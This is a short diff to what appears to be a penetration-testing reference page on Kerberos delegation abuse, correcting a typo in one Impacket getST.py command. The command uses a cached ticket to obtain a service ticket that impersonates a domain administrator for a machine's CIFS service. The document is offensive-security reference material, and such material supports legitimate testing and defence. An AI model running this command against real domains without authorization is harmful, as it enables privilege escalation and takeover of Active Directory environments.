@@ -70,7 +70,7 @@ From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s
 
 ```bash
 export KRB5CCNAME="/path/to/ticket.ccache"
-getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no -pass -dc-ip "DomainController" "domain.local"/'machine$' 
+getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no-pass -dc-ip "DomainController" "domain.local"/'machine$' 
 ```
 {% endtab %}
 
